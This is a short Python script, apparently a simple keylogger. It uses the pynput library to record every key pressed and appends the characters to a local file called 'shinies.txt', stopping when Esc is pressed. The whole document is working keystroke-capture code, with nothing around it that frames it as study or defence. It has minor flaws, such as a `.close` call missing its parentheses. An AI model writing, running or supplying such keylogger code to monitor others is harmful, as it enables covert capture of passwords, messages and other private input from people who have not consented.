import pynput
from pynput.keyboard import Key, Listener

keys = []

open('shinies.txt', 'w')
open('shinies.txt', 'w').close

def write_file(keys):
    with open('shinies.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_press(key):
    global keys
    keys.append(key)
    if len(keys) >= 1:
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
